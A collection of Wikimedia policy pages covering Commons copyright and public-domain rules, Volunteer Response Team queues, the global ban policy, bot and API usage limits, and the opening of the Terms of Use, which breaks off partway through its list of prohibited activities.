However, the year and location of publication is essential. In several countries, material published before a certain year is in the public domain. In the U.S. this date is January 1, 1930. In some countries, all government-published material is public domain, while in others governments claim some copyright (see Commons:Copyright rules by territory).

In the US, the copyright situation for sound recordings (including those published before 1930) is a special case. Under Title II of the Music Modernization Act, recordings that were first fixed prior to February 15, 1972 are copyrighted for a period of time under US federal copyright that depends on when the recording was first published. This federal copyright applies regardless of any formalities (copyright notice, registration, and/or renewal.) The specific copyright term lengths are as follows:

 * Recordings that were first published prior to 1923 entered the public domain on January 1, 2022.
 * Recordings that were first published between 1923 and 1946 are copyrighted for a period of 100 years after first publication.
 * Recordings that were first published between 1947 and 1956 are copyrighted for a period of 110 years after first publication.
 * Recordings that were published after 1956 and first fixed prior to February 15, 1972 will enter the public domain on February 15, 2067.

Sound recordings that were first fixed on or after February 15, 1972 are subject to the same US copyright law term lengths and provisions as other works.

In some jurisdictions (like the United States), one can also explicitly donate work one has created oneself to the public domain. In other places (like the European Union) this is technically not possible; instead, one can grant the right to use the picture freely with, for example, the Creative Commons Zero Waiver, which waives all rights granted by copyright, but the waiver might not be legally binding in the full extent of what is normally understood as “public domain” (e.g. regarding authors' moral rights).

The Hirtle chart is a tool for helping to determine if something is in the public domain in the United States. Commons:International copyright quick reference guide helps to determine if a work first published outside the United States can be uploaded.


INTERACTION OF US AND NON-US COPYRIGHT LAW

Every faithful reproduction of Mona Lisa is considered by Commons to be public domain. See "Exception" in text for details.

Commons is an international project, but its servers are located in the U.S., and its content should be maximally reusable. Uploads of non-U.S. works are normally allowed only if the work is either in the public domain or covered by a valid free license in both the U.S. and the country of origin of the work. The "country of origin" of a work is generally the country where the work was first published.[1]

When uploading material from a country outside the U.S., the copyright laws of that country and the U.S. normally apply. If material that has been saved from a third-party website is uploaded to Commons, the copyright laws of the U.S., the country of residence of the uploader, and the country of location of the web servers of the website apply. Thus, any licence to use the material should apply in all relevant jurisdictions; if the material is in the public domain, it must normally be in the public domain in all these jurisdictions (plus in the country of origin of the work) for it to be allowable on Commons.

For example, if a person in the UK uploads a picture that has been saved off a French website to the Commons server, the uploader must be covered by UK, French and US copyright law. For that person to upload that photograph to Commons, the photograph must be public domain in France, the UK and the US, or there must be an acceptable copyright license for the photograph that covers the UK, US and France.

Exception: Faithful reproductions of two-dimensional works of art, such as paintings, which are in the public domain are an exception to this rule. In July 2008, following a statement clarifying WMF policy, Commons voted to the effect that all such photographs are accepted as public domain regardless of country of origin, and tagged with a warning. For details, see Commons:When to use the PD-Art tag.


URUGUAY ROUND AGREEMENTS ACT

Main page: Commons:URAA-restored copyrights

The Uruguay Round Agreements Act or URAA is a US law that restored copyrights in the U.S. on foreign works if that work was still copyrighted in the foreign source country on the URAA date. This URAA date was January 1, 1996 for most countries. This means that foreign works became copyrighted in the U.S. even if they had been in the public domain in the U.S. before the URAA date. See also Wikipedia:Non-U.S. copyrights.

Because the constitutionality of this law was challenged in court, Commons initially permitted users to upload images that would have been public domain in the U.S. without the URAA. However, the constitutionality of the URAA was upheld by the U.S. Supreme Court in Golan v. Holder. After discussion, it was determined that the affected files would not be deleted en masse but reviewed individually. There was further discussion about the best method for review of affected files, resulting in the creation of Commons:WikiProject Public Domain (not active anymore).

Files affected by the URAA should be tagged with {{Not-PD-US-URAA}}.

Files nominated for deletion due to the URAA should be evaluated carefully, as should be their copyright status under US and local laws. A mere allegation that the URAA applies to a file cannot be the sole reason for deletion. If the end result of copyright evaluation is that there is significant doubt about the freedom of a file under US or local law, the file must be deleted in line with the precautionary principle.


OLD ORPHAN WORKS

Old orphan works are accepted, provided that at least one of the following two conditions applies:

 * the works were created before 1930;
 * the works were created before the pma duration (required years after the author's death) in the country of origin, which would satisfy {{PD-1996}} if published at the time of creation (e.g. works created before 1946 for 50 years pma countries, where the URAA date for that country is 1996).

When uploading such works, please add {{Orphan works}} to the file page to explain the situation.


PD 1.0 AND FLICKR

See also: Commons:Flickr files.

The Creative Commons Public Domain 1.0 mark (PDM) is often applied to images on photography websites such as Flickr.com, and is not a license. Despite this, the community found that when a user applies PDM to their own work, they are releasing their work to be in the public domain, and these works are believed to be freely licensed. For further information, see Accept files published by the copyright holder with a Public Domain Mark.


FAIR USE IS NOT ALLOWED ON COMMONS

Wikimedia Commons does not accept content under the condition of fair use. See Commons:Fair use.


DERIVATIVE WORKS

This montage is an example of a derivative work. It combines various preexisting images that are in the public domain or available under the Creative Commons BY-SA 3.0 license.

Imagine you want to upload a picture of Bart Simpson, but of course you can't just scan it in. Why not take a picture of a little action figure and then upload it? Don't. The reason why you can't upload photographs of such figures is that they are considered derivative works. Such works can't be published without permission of the original creator.

The US Copyright Act of 1976, Section 101, says: "A derivative work is a work based upon one or more preexisting works, such as a translation, musical arrangement, dramatization, fictionalization, motion picture version, sound recording, art reproduction, abridgment, condensation, or any other form in which a work may be recast, transformed, or adapted. A work consisting of editorial revisions, annotations, elaborations, or other modifications which, as a whole, represent an original work of authorship, is a “derivative work”." A photograph of a copyrighted item is considered a derivative work in US jurisdiction. US Copyright Act of 1976, Section 106: "(...) The owner of copyright under this title has the exclusive rights to do and to authorize any of the following: (...) (2) to prepare derivative works based upon the copyrighted work;"

Therefore, "unauthorized" derivative works, like photographs of copyrighted action figures, toys, etc., must be deleted. For more information, see Commons:Derivative works.

Exception: So-called useful articles - objects with an intrinsic utilitarian function, even if commercial designs, are not subject to copyright protection in the US. Consequently, images thereof are not derivative works under US law. For details and applicability of this exception, see the Supreme Court’s decision in Mazer v. Stein, and {{Useful-object-US}}.


SIMPLE DESIGN

Logo of Microsoft – {{PD-textlogo}}

Regarding trademarks (see also Commons:Copyright rules by subject matter: Trademarks): Most commercial items and products are protected by intellectual property laws in one way or another, but copyright is only one such protection. It is important to make the distinction between copyright, trademarks, and patents. Wikimedia Commons generally only enforces copyright restrictions, for these reasons:

 1. Almost anything can be trademarked, and it wouldn't make sense to forbid everything.
 2. Trademarks and industrial designs restrictions are pertinent to industrial reproduction, but photographs of such items can otherwise be freely reproduced.

→ For these reasons Commons accepts any trademark whose copyright has expired. Moreover, Commons accepts images of text in a general typeface and of simple geometric shapes, even if it happens to be a recent trademarked logo, on the grounds that such an image is not sufficiently creative to attract copyright protection.[2] Such images should be tagged with {{PD-ineligible}} or one of the list of more specific tags for this kind of works (e.g. {{PD-textlogo}} for simple logos).

Raster renderings (i.e. PNG images) of uncopyrighted simple designs can themselves be regarded as being uncopyrighted. For vector images (i.e. SVG files) of uncopyrighted simple designs, the question as to whether the vector representation has its own copyright is less clear; see the English Wikipedia copyright information about fonts and the {{PD-textlogo}} talk page for more information.

It is often very difficult to determine whether a design is protected by copyright or not, and images of these sorts are frequently nominated for deletion, with various results. See Commons:Threshold of originality and/or “Threshold of originality” (in Wikipedia) for some guidance.


FONTS

"COM:FONT" redirects here. For the fonts available for SVG rendering, see meta:SVG fonts.
Shortcut
 * COM:FONT

The raster rendering of a font (or typeface) is not subject to copyright in the U.S., and therefore is in the public domain. It may be copyrighted in other countries (see intellectual property of typefaces on Wikipedia). You should use {{PD-font}} in this case.

NOTES

 1. ↑ In cases where a work is simultaneously published in multiple countries, the "country of origin" is the country which grants the shortest term of copyright protection, per the Berne Convention.
 2. ↑ See Ets-Hokin v. Skyy Spirits Inc where it was decided that the SKYY vodka bottle and logo were not copyrightable.

VRT

The Volunteer Response Team (VRT) is a group of volunteers who handle queries, complaints, and comments from the public by email to Wikimedia projects since September 2004. Volunteers trusted to give courteous, helpful, and accurate responses are given access to the VRT software (VRTS) via the web at https://ticket.wikimedia.org/. More volunteers are always needed, so if you are interested in volunteering please read VRT/Recruiting for more information on how you can help out. Generally, if you are an experienced editor and feel qualified to help with answering emails in your language, please consider submitting an application to volunteer. If you would like to help set up an email address for a project/language that does not yet have a queue in VRTS, please contact a VRTS admin to set one up.

The Volunteer Response Team was previously known as OTRS, named after the software that powered the system, Open-source Ticket Request System (OTRS). ("Volunteer Response Team" was then used as an alternative name in some wikis.) In 2021, the open-source edition of OTRS is discontinued, and in Wikimedia it is replaced by an open-source fork, Znuny. The term "VRT software" is meant to prevent future renames in case of other software or structural changes.

There is also an IRC channel (#wikimedia-vrtconnect), private wiki, and several mailing lists dedicated to Wikimedia VRT. Access of VRTS wiki and other related resources are governed by the access policy. There is a global vrts-permissions user group; members in this group have access to at least one permissions-related queue.


QUEUES

E-mails received by the VRTS are sorted into "queues" based on the address they were sent to (and/or subject matter of the messager). VRTS volunteers (often referred to as "VRTS agents") have access to one or more queues, depending on their position within the Wikimedia community. Tickets in a particular queue are visible to all volunteers who have access to that queue. The Wikimedia Foundation cannot guarantee confidential treatment of any sensitive information you include in your message, although all volunteers are required to treat it with confidentiality. Users should be careful of revealing personally-identifying information of subjects or creators, particularly names, physical addresses, and emails.

Listed below are "community queues", which typically represent a specific project or language. Wikimedians interested in volunteering are able to apply to any of the queues listed below. Info and permission queue (other than permissions-commons) are categorized by language, not by project. For example, the info-zh queue deals with all matters written in Chinese, whether they are about Chinese Wikipedia, other Chinese sister projects or Chinese-related issue in multilingual projects such as Commons. There are many other queues within the system but they have restricted access (for example chapter queue access is approved by a chapter representative).

Daily reports of high-traffic queues are available on Toolforge.

VRTS queues are managed by VRTS administrators. To request a new queue, contact VRTS administrators.


INFO

These queues are the general information addresses that are displayed on the Contact us pages on the Wikipedia projects (See the English Wikipedia's page, for example). Emails to these addresses usually deal with questions from readers of Wikipedia and from the subjects of articles. Emails are sorted into queues based on the language that they are written in, not the project that they relate to, because the queues are staffed by Wikimedia volunteers speaking a certain language, not from a certain project. Info queues are currently available in the following languages:

 * info (for all other languages)
 * info-als (Alemannic)
 * info-ar (Arabic)
 * info-bn (Bangla)
 * info-ca (Catalan)
 * info-cs (Czech)
 * info-da (Danish)
 * info-de (German)

 * info-zh (Chinese)


PERMISSIONS

Sometimes Wikimedians would like to use images that do not have clear cut licensing information in articles. These images might not be licensed already, might have a license that is not permissive enough for use on Wikipedia, or might otherwise need confirmation that the copyright holder has agreed to the license shown on the projects. Wikimedians often contact the copyright holders of various images and ask them to license them so that they can be used on Wikimedia projects. The permissions team on VRTS is the one that processes these "permissions" e-mails and attempts to verify that the copyright holder releases the images under an allowable license, that they do so clearly while understanding what that means, and that they actually are allowed to license the images in such a way (e.g. they hold copyright). These e-mails are then stored in the ticket system so that they can be verified by anyone with appropriate access.

 * permissions-commons (for Commons-hosted media)
 * permissions-ar (Arabic)
 * permissions-cs (Czech)
 * permissions-de (German)
 * permissions-el (Greek)
 * permissions-en (English)
 * permissions-es (Spanish)

 * permissions-vi (Vietnamese)
 * permissions-zh-hans (Simplified Chinese)
 * permissions-zh-hant (Traditional Chinese)


PHOTOSUBMISSIONS

Wikimedia projects often lack good, freely-licensed images for certain articles, especially biographies of living persons. To mitigate this, the photosubmission queues were created on VRTS. They allow readers of Wikipedia and subjects (or their agents) of articles on the project to easily submit (via email to us) photos to help illustrate their articles.

Similar to the operation of permissions queues, the photosubmission team verifies that the person submitting the image is capable of freely licensing it, that they clearly state their intent to license it under a specific free license, and that they understand what they are doing. The team then helps by uploading and adding the image(s) to the relevant articles. The Dutch VRT has a similar initiative as part of their info-nl queue: Wikiportrait.

Although the majority of our mail goes to Wikipedia-related queues, we do have dedicated queues set up for each of the "sister projects" shown above. These queues were created to give each of our projects the special attention they deserve so that we can seek out the best volunteer agents to serve on our team on those particular queues. If you have any particular knowledge about any of the Sister projects above, please feel free to request access to them individually as part of your application.


OTHER QUEUES

There are many other queues in use within our VRTS implementation. They range in purpose but share one core purpose: to assist in facilitating communication amongst Wikimedia users, readers, customers and anybody else who has something to say! Through Wikimedia VRTS we support “Wiki Loves Monuments”, a number of Wikimedia chapters, several local oversight teams and numerous other foundation-related projects.

The following page documents an official global policy.
This page has been developed and approved by the community and its compliance is mandatory for all projects. It must not be modified without prior community approval.

A global ban is a formal revocation of editing or other access privileges (use of "Special:EmailUser" for example) across all Wikimedia projects. It reflects a broad and clear community consensus. A global ban is not a form of punishment, nor is it meant to provide a “cool down” period. A global ban's purpose is to prevent harm to Wikimedia projects when a problem cannot be addressed by the community through less restrictive means, and consequently is usually permanent.

Global bans are exclusively applied where multiple independent communities have previously elected to ban a user for a pattern of abuse. Wikimedia projects are entirely self-governing. Typically, good faith is assumed when a user chooses to become a member of a new community, regardless of their history on other projects. Consequently, global bans are not a possibility where a user is only temporarily blocked, or only banned on a single project. Please remember, global bans are intentionally very infrequent.

Global bans should not be confused with global blocking, a technical mechanism to prevent IP addresses (or ranges of them) and registered users from editing any Wikimedia project, except for Meta-Wiki. This policy covers only community-issued global bans. The Wikimedia Foundation also has the right to unilaterally globally ban anyone, and those global bans are covered by the WMF Global Ban Policy.




CRITERIA FOR GLOBAL BANS

Global bans are only considered when all the following criteria are met:

 1. The user demonstrates an ongoing pattern of cross-wiki abuse that is not merely vandalism or spam. No global ban is required for uncontroversial cases of cross-wiki vandalism or spam, since these may be handled with a block or lock (which may be made by a steward, without need for extensive discussion). See Steward requests/Global.
 2. The user has been carefully informed about appropriate participation in the projects and has had fair opportunity to rectify any problems. These projects must have demonstrated a good faith attempt to explain acceptable practices and behaviors that are consistent with their mission and scope. This criterion is to show users reasonably know what is expected, have had ample opportunity to appropriately address concerns, and chose not to participate appropriately in projects.
 3. The user is indefinitely blocked or banned on two or more projects. These blocks or bans must be based on the user's local disruptive behavior, and do not include protective blocks such as preemptive blocks on user without local edits, and blocks based on account security issue or problematic username.

Merely meeting the above minimum criteria does not mean that a global ban is required. Past reasons for requesting a global ban have included:

 * Harassing or threatening contributors to the projects, on- or off-wiki.
 * Serious on-wiki fraud or identity theft that is not simple abuse of multiple accounts.
 * Inappropriate use of user rights with access to private information, such as CheckUser or Oversight.
 * Violations of the privacy policy or other official Wikimedia policies.
 * Persistent cross-wiki copyright violation.


RELATION TO LOCAL POLICY

This policy is meant to complement existing policies and procedures for all projects, not act as a replacement. All governance of the dispute resolution process remains the responsibility of each individual community, and this process is not a venue for entertaining proposals to ban or block a user on a single project.


RELATION TO THE TERMS OF USE

The Wikimedia Terms of Use, which apply equally to all users of the projects, specifically refer to this policy and supports banning users violating either the terms themselves or any mandatory community policies and guidelines. As the service provider of Wikimedia websites, the Foundation has and continues to support community consensus relating to blocking and banning decisions.


OBTAINING CONSENSUS FOR A GLOBAL BAN

A simplified workflow.

Consensus for a global ban is conducted through the requests for comment process on Meta. A global ban request must only be accepted when a user presents a clear and current danger to all Wikimedia communities, a decision is backed by a broad and clear consensus that fairly represents the vast majority of Wikimedia projects, and careful consideration of concerns and possible consequences are evident in the decision. In order to initiate a discussion on whether harm to all communities is evident and merits a global ban, please do the following:

 1. Confirm that the user satisfies all criteria for global bans prior to opening a request for comment.
 2. File a new request for comment on Meta. The title should have the username of the user nominated for a global ban. The nominator must impartially document the significant incidences that satisfy all criteria for global bans. The nominator must also attempt to show that the user's decision not to participate appropriately presents a current danger to all Wikimedia communities.
 3. Inform the user about the discussion on all wikis where they are active. If the user nominated for a global ban is blocked on Meta, a temporary unblock may be considered to allow participation in the discussion.
 4. Inform the community on all wikis where the user has edited about the discussion through a prominent public venue. Be sure to stay neutral in your communications and avoid any defamatory, inaccurate, or exaggerated commentary.

A nomination that fails to correctly follow the above steps is invalid, and may be speedily closed. In addition, to make a nomination valid, the nominator must:

 1. have a Wikimedia account; and
 2. be registered for more than six months before making the request; and
 3. have at least 500 edits globally (on all Wikimedia wikis).

Once a valid request for comment has developed a broad and clear consensus, an uninvolved and impartial steward may close the discussion. Discussion should be open for at least two weeks, but no more than one month. Stewards may extend the discussion in exceptional circumstances. Requests can be closed without extensive discussion when frivolous. Requests can be closed after an extensive discussion when no consensus is likely to be reached.


MULTILINGUALISM IN DISCUSSION

Please be aware that the discussion can and should be conducted in the relevant language or languages of any projects where the user has been active. Wikimedia projects exist in hundreds of languages, and thus a wide variety of communities should be afforded the ability to participate in global discussions regardless of their fluency in any second language. In cases where there are no human translators available, machine translation may function as a substitute for communication between communities.


IMPLEMENTING A GLOBAL BAN

A global ban formally revokes some or all privileges at all Wikimedia projects, regardless of whether accounts are attached through the unified login system. Any attempt to circumvent an active global ban constitutes a violation of the Terms of Use, regardless of accounts used. Accordingly, local communities where the user is blocked or active should be informed in a prominent public venue about the decision. Stewards may also choose to respond to requests to globally lock proven alternate accounts of a globally banned user.

If the consensus requires steward action, a request should be made to the stewards. Please provide a link to the relevant discussion in your request; otherwise it will be rejected for lack of consensus.


OVERTURNING A GLOBAL BAN DECISION

Discussion to overturn a global ban decision is conducted through the request for comment process on Meta, in order to include the widest possible audience. A request must follow the same consensus process for requesting a ban, described above.

From Wikitech


As an Operator of a program automatically consuming the content of the wikis (robot), certain rules apply which depend on the type of content you’re accessing and how you access it. Bots that don't follow these guidelines may be rate-limited and informed of the reason, and pointed to ways to request higher quotas or exemptions.

Bots that repeatedly try to get around these guidelines or rate limits, and/or threaten the stability of the sites may be blocked.


Please note: while the guidelines apply to any bot that connects to our environment, rate limiting is not enforced on bots in Toolforge.

The following rules are an evolution of the previous version of this policy which was originally published in 2009. The updates include coverage of more systems, better defined limits, and clarifications to help any Bot Operator who acts in good faith to limit their impact on our systems.


GENERALLY APPLICABLE RULES

The following rules apply to any activity on our websites; rules in the following sections will be specific to sites/URLs instead.

 1. Consider if dumps are more efficient than live requests. Check if you can use Wikimedia Dumps or other forms of offline collection of our data instead of making live requests. If dumps are a viable option for your use case it will reduce the strain on our very limited resources and make your life easier.
 2. Accurately identify your User-Agent. Always identify your bot clearly via its User-Agent HTTP header by following the Wikimedia Foundation User-Agent Policy.
 3. When you are making a significant number of requests avoid user-agent impersonation and possible collateral damage blocks by either:
    1. Provide a URL where we can download a JSON formatted list of CIDRs from which your requests will originate. See the "what to do if the limits are too strict for me" section.
    2. Authenticate your requests using an on-wiki account when you are making API requests. An OAuth owner-only consumer is the most ideal authentication method.
 4. Honor Robots.txt. Honor every directive in our robots.txt file.
 5. Default to gzip. Always request content with an Accept-Encoding: gzip HTTP header to reduce bandwidth usage. This is not necessary when you are directly requesting media files (i.e. images or video) which are already in a compressed format.
 6. Respect our HTTP status codes. When we reply with a 429 Too Many Requests status code respect the delay specified by the Retry-After header sent with the response.
 7. Cached interfaces are preferred and more efficient. If you need the HTML content of pages use either the /wiki/Article_name URL or the corresponding Wikimedia REST API /api/rest_v1/page/html/Article_name endpoint. These requests will be cheaper for us and faster for you because they can be cached in our content delivery network. More information about these request methods can be found below.


WEBSITE RULES

i.e. https://en.wikipedia.org/wiki/Main_Page
 1. Always crawl the website via the /wiki/Article_name URLs, with no query parameters. This will ensure that if the content is CDN-cached, you’ll get a faster response allowing you to crawl the site faster and more efficiently.
 2. If you're making read requests, do not emulate a browser - do not store cookies or execute javascript, unless you're not crawling the sites at high volume (so, more than 5 requests per second).
 3. Assuming you are following all of our best practices ideally, still ensure that the maximum concurrent number of requests is fewer than 10 overall, and keep the average requests per second below 20.
 4. Avoid accessing content that is not current, or via non-canonical URLs: do not crawl the site using the oldId or curid parameters, and only use the /wiki/Title format URLs.


REST API RULES

i.e. https://en.wikipedia.org/api/…
 1. You can use this interface to fetch the HTML content of the pages, or their summary.
 2. Always limit the total concurrent number of requests to less than 5 overall, and the total number of requests per second below 10.
 3. Do not send authentication cookies with your request.
 4. Avoid accessing content that is not current, so avoid requesting a specific revision in your URL.


ACTION API RULES

i.e. https://en.wikipedia.org/w/api.php?…
 1. Avoid using the action API for HTML content of pages. Use the website and/or the REST API instead.
 2. Keep the concurrency of your requests to 1 at a time, and below 5 requests per second overall, if unauthenticated.
 3. If authenticated, you can raise the concurrency to 3 overall, and the number of requests per second to 10.
 4. Avoid using expensive API endpoints: if your request takes more than 1 second to serve, please wait 5 seconds before making another request.
 5. Where supported, use batch requests.


MEDIA API RULES

i.e. https://upload.wikimedia.org/…
 1. Always keep a total concurrency of at most 2, and limit your total download speed to 25 Mbps (as measured over 10 second intervals).
 2. Only use originals or one of our pregenerated thumbnail sizes, which you can fetch here in json format.


RULES FOR OTHER RESOURCES

i.e. GitLab, gerrit, Phabricator, etc.
 1. Always keep a total concurrency of at most 1, and use a delay between requests of at least 1 second.
 2. Pause crawling for at least 15 minutes if you receive a 5xx status code.


WHAT TO DO IF THESE LIMITS ARE TOO STRICT FOR ME?

These limits are not per-domain but global for all Wikimedia properties, with an exception for community projects of the kind which would be eligible to run in Wikimedia Foundation’s hosted infrastructure (Wikimedia Cloud Services offerings).

Specifically, bots running in Toolforge and in any other Wikimedia Cloud Services offering are explicitly exempted from such limits. We will still reserve the right to temporarily rate-limit or block individual bots that might be compromising the stability of the websites.

If you are an external entity and you need a higher volume of requests, please refer to the High-Volume access page on the Wikimedia Developer Portal.

This page in a nutshell:
 * Set an informative User-Agent string with contact information, or you may be IP-blocked without notice. See the User-Agent policy for more details.
 * Make your requests in series rather than in parallel, by waiting for one request to finish before sending a new request.
 * Perform grouped updates via one single editEntity, for all languages and for labels, descriptions, and aliases at once.
 * On Wikimedia wikis, there may be faster ways to get bulk data. See m:Research:Data and wikitech:Portal:Data Services for more details.
 * See also the official guidelines about API usage on Wikimedia Foundation Governance wiki.

This page contains the best practices that should be followed when using the API. See also the official guidelines about API usage on Wikimedia Foundation Governance wiki.


BEHAVIOR


REQUEST LIMIT

There is no hard speed limit on read requests, but be considerate and try not to take a site down. Most system administrators reserve the right to unceremoniously block you if you do endanger the stability of their site.

Making your requests in series rather than in parallel, by waiting for one request to finish before sending a new request, should result in a safe request rate. It is also recommended that you ask for multiple items in one request by:

 * Using the pipe character (|) whenever possible e.g. titles=PageA|PageB|PageC, instead of making a new request for each title.
 * Using a generator instead of making a request for each result from another request.

 * Use GZip compression when making API calls by setting Accept-Encoding: gzip to reduce bandwidth usage.

Requests which make edits, modify state or otherwise are not read-only requests, are subject to rate limiting. The exact rate limit being applied might depend on the type of action, your user rights and the configuration of the website you are making the request to. The limits that apply to you can be determined by accessing the action=query&meta=userinfo&uiprop=ratelimits API endpoint.

api.php?action=query&format=json&meta=userinfo&uiprop=ratelimits [try in ApiSandbox]

When you hit the request rate limit you will receive a API error response with the error code ratelimited. When you encounter this error, you may retry that request, however you should increase the time between subsequent requests. A common strategy for this is Exponential backoff.


PARSING OF REVISIONS

While it is possible to query for results from a specific revision number using the revid parameter, this is an expensive operation for the servers. To retrieve a specific revision use the oldid parameter. For example:

api.php?action=parse&format=json&prop=images&oldid=254862759 [try in ApiSandbox]


THE MAXLAG PARAMETER

If your task is not interactive, i.e. a user is not waiting for the result, you should use the maxlag parameter. The value of the maxlag parameter should be an integer number of seconds. For example:

api.php?action=query&format=json&titles=Main%20Page&maxlag=1 [try in ApiSandbox]

This will prevent your task from running when the load on the servers is high. Higher values mean more aggressive behavior, lower values are nicer.

See Manual:Maxlag parameter for more details.


THE USER-AGENT HEADER

It is best practice to set a descriptive User Agent header. To do so, use User-Agent: clientname/version (contact information e.g. username, email) framework/version.... For example in PHP:

ini_set('user_agent', 'MyCoolTool/1.1 (https://example.org/MyCoolTool/; MyCoolTool@example.org) UsedBaseLibrary/1.4');


Do not simply copy the user-agent of a popular web browser. This ensures that if a problem does arise it is easy to track down where it originates.

If you are calling the API from browser-based JavaScript, you may not be able to influence the User-Agent header, depending on the browser. To work around this, use the Api-User-Agent header.

See User-Agent policy for more details.


DATA FORMATS

All new API users should use JSON . See API:Data formats for more details.


PERFORMANCE

Downloading data in bulk is not always extremely efficient using the Action API. On Wikimedia wikis, there are faster ways to get data in bulk, see m:Research:Data and wikitech:Portal:Data Services for more details.


OTHER NOTES

If your requests obtain data that can be cached for a while, you should take steps to cache it, so you don't request the same data over and over again. Some clients may be able to cache data themselves, but for others (particularly JavaScript clients), this is not possible.

Whenever you're reading data from the web service API, you should try to use GET requests if possible, not POST, as the latter are not cacheable and, in multi-datacenter configurations (including Wikimedia sites), may go to a farther data center.

In exceptional cases where you really need to use POST for a read request, such as calling action=parse with a long string of wikitext, consider setting the Promise-Non-Write-API-Action: true header. This helps ensure that your POST request is processed by an application server in the closest data center, if appropriate. There is no need to set this header for GET requests, and neither should it be set when making cross-wiki requests within a wiki family using CentralAuth; see T91820.

OUR TERMS OF USE

Imagine a world in which every single human being can freely share in the sum of all knowledge. That's our commitment. – Our Vision Statement

Welcome to Wikimedia! The Wikimedia Foundation, Inc. (“we” or “us”), is a nonprofit charitable organization whose mission is to empower and engage people around the world to collect and develop content under a free license or in the public domain, and to disseminate it effectively and globally, free of charge.

To support our vibrant community, we provide the essential infrastructure and organizational framework for the development of multilingual wiki Projects and their editions (as explained here) and other endeavors which serve this mission. We strive to make and keep educational and informational content from the Projects available on the internet free of charge, in perpetuity.

We welcome you (“you” or the “user”) as a reader, editor, author, or contributor of the Wikimedia Projects, and we encourage you to join the Wikimedia community. Before you participate, however, we ask that you please read and agree to the following Terms of Use (“Terms of Use”).


OVERVIEW

These Terms of Use tell you about our public services at the Wikimedia Foundation, our relationship to you as a user, and the rights and responsibilities that guide us both. We want you to know that we host an incredible quantity of educational and informational content, all of which is contributed and made possible by users like yourself. Generally we do not contribute, monitor, or delete content (with the rare exception of policies like these Terms of Use or legal compliance for DMCA notices). This means that editorial control is in the hands of you and your fellow users who create and manage the content. We merely host this content.

The community - the network of users who are constantly building and using the various sites or Projects - are the principal means through which the goals of the mission are achieved. The community contributes to and helps govern our sites. The community undertakes the critical function of creating and enforcing policies for the specific Project editions (such as the different language editions for the Wikipedia Project or the Wikimedia Commons multi-lingual edition).

You are welcome to join as a contributor, editor, or author, but you should follow the policies that govern each of the independent Project editions. The largest of our Projects is Wikipedia, but we host other Projects too, each with different objectives and work methods. Each Project edition has a team of contributors, editors or authors who work together to create and manage the content on that Project edition. You are welcome to join these teams and work with them to improve these Projects. Because we are dedicated to making content freely accessible to the public, we generally require that all content you contribute is available under a free license or in the public domain.

Please be aware that you are legally responsible for all of your contributions, edits, and re-use of Wikimedia content under the laws of the United States of America and other applicable laws (which may include the laws where you live or where you view or edit content). This means it is important that you use caution when posting content. In light of this responsibility, we have some rules about what you cannot post, most of which is either for your own protection or for the protection of other users like yourself. Please keep in mind that the content we host is for general informational purposes only, so if you need expert advice for a particular question (such as medical, legal, or financial issues), you should seek the help of a licensed or qualified professional. We also include other important notices and disclaimers, so please read these Terms of Use in their entirety.

For clarity, other organizations, such as local Wikimedia chapters and associations, that may share in the same mission are nevertheless legally independent and separate from the Wikimedia Foundation and have no responsibility for the operations of the website or its content.







1. OUR SERVICES

The Wikimedia Foundation is dedicated to encouraging the growth, development and distribution of free multilingual content, and to hosting the full content of these wiki-based Projects for the public free of charge. Our role is to host some of the largest collaboratively edited reference Projects in the world, which can be found here. However, we act only as a hosting service, maintaining the infrastructure and organizational framework that allows our users to build the Wikimedia Projects by contributing and editing content themselves. Because of our unique role, there are a couple of things you should be aware of when considering our relationship to you, the Projects, and the other users:

 1. We do not take an editorial role: Because the Wikimedia Projects are collaboratively edited, all of the content that we host is provided by users like yourself, and we do not take an editorial role. This means that we generally do not monitor or edit the content of the Project websites, and we do not take any responsibility for this content. Similarly, we do not endorse any opinions expressed via our services, and we do not represent or guarantee the truthfulness, accuracy, or reliability of any submitted community content. Instead, we simply provide access to the content that your fellow users have contributed and edited.
 2. You are responsible for your own actions: You are legally responsible for your edits and contributions on Wikimedia Projects, so for your own protection you should exercise caution and avoid contributing any content that may result in criminal or civil liability under any applicable laws. For clarity, applicable law includes at least the laws of the United States of America. Although we may not agree with such actions, we warn editors and contributors that authorities may seek to apply other country laws to you, including local laws where you live or where you view or edit content. WMF generally cannot offer any protection, guarantee, immunity or indemnification.


2. PRIVACY POLICY

We ask that you review the terms of our Privacy Policy, so that you are aware of how we collect and use your information. Because our services are used by people all over the world, personal information that we collect may be stored and processed in the United States of America or any other country in which we or our agents maintain facilities. By using our services, you consent to any such transfer of information outside your country.


3. CONTENT WE HOST

 1. You may find some material objectionable or erroneous: Because we provide a wide array of content that is produced or gathered by fellow users, you may encounter material that you find offensive, erroneous, misleading, mislabeled, or otherwise objectionable. We therefore ask that you use common sense and proper judgment when using our services.
 2. Our content is for general informational purposes only: Although we host a great deal of information that pertains to professional topics, including medical, legal, or financial issues, this content is presented for general informational purposes only. It should not be taken as professional advice. Please seek independent professional counseling from someone who is licensed or qualified in the applicable area in lieu of acting on any information, opinion, or advice contained in one of the Project websites.


4. REFRAINING FROM CERTAIN ACTIVITIES

The Projects hosted by the Wikimedia Foundation only exist because of the vibrant community of users like you who collaborate to write, edit, and curate the content. We happily welcome your participation in this community. We encourage you to be civil and polite in your interactions with others in the community, to act in good faith, and to make edits and contributions aimed at furthering the mission of the shared Project.

Certain activities, whether legal or illegal, may be harmful to other users and violate our rules, and some activities may also subject you to liability. Therefore, for your own protection and for that of other users, you may not engage in such activities on our sites. These activities include:

Harassing and Abusing Others
 * Engaging in harassment, threats, stalking, spamming, or vandalism; and
 * Transmitting chain mail, junk mail, or spam to other users.

Violating the Privacy of Others
 * Infringing the privacy rights of others under the laws of the United States of America or other applicable laws (which may include the laws where you live or where you view or edit content);
 * Soliciting personally identifiable information for purposes of harassment, exploitation, violation of privacy, or any promotional or commercial purpose not explicitly approved by the Wikimedia Foundation; and
 * Soliciting personally identifiable information from anyone under the age of 18 for an illegal purpose or violating any applicable law regarding the health or well-being of minors.

Engaging in False Statements, Impersonation, or Fraud
 * Intentionally or knowingly posting content that constitutes libel or defamation;
 * With the intent to deceive, posting content that is false or inaccurate;
 * Attempting to impersonate another user or individual, misrepresenting your affiliation with any individual or entity, or using the username of another user with the intent to deceive; and
 * Engaging in fraud.

Committing Infringement
 * Infringing copyrights, trademarks, patents, or other proprietary rights under applicable law.

Misusing Our Services for Other Illegal Purposes
 * Posting child pornography or any other content that violates applicable law concerning child pornography;
 * Posting or trafficking in obscene material that is unlawful under applicable law; and
